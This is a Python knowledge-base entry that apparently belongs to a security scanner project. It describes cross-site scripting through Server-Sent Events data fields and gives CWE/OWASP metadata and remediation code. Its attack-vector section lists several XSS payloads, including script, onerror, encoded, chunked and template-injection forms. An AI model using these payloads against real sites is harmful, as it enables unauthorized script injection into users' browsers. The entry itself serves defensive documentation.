#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: SSE Data Field XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via SSE Data Field",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "sse", "eventsource", "data", "streaming", "push"],
    "description": """
SSE (Server-Sent Events) data field XSS occurs when the data: field content
is rendered in the DOM without sanitization.

SEVERITY: HIGH
SSE data is often trusted as server-originated. Multiple data lines are concatenated.
JSON data in SSE is commonly parsed and rendered unsafely.
""",
    "attack_vector": """
DIRECT DATA XSS:
data: <script>alert(1)</script>

MULTILINE DATA:
data: <script>
data: alert(1)
data: </script>

JSON IN DATA:
data: {"html": "<img src=x onerror=alert(1)>"}
// Rendered: div.innerHTML = JSON.parse(e.data).html;

ENCODED DATA:
data: &lt;script&gt;alert(1)&lt;/script&gt;
// If double-decoded

UNICODE DATA:
data: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e

BASE64 DATA:
data: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
// If decoded and rendered

CHUNKED DATA:
data: <scr
data: ipt>ale
data: rt(1)</sc
data: ript>

TEMPLATE IN DATA:
data: {{constructor.constructor('alert(1)')()}}
""",
    "remediation": """
DEFENSE:

1. SANITIZE SSE data before DOM insertion
2. Use textContent for safe display
3. Validate JSON schema
4. Encode data server-side
5. Implement CSP
6. Don't use innerHTML with SSE

SAFE PATTERN:
const source = new EventSource('/events');
source.onmessage = (e) => {
  const p = document.createElement('p');
  p.textContent = e.data;  // Safe
  feed.appendChild(p);
};

// JSON data:
source.onmessage = (e) => {
  const data = JSON.parse(e.data);
  element.textContent = data.message;
};

SERVER-SIDE ENCODING:
# Python
import html
def send_event(message):
    return f"data: {html.escape(message)}\\n\\n"

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- Server-Sent Events Security
""",
}
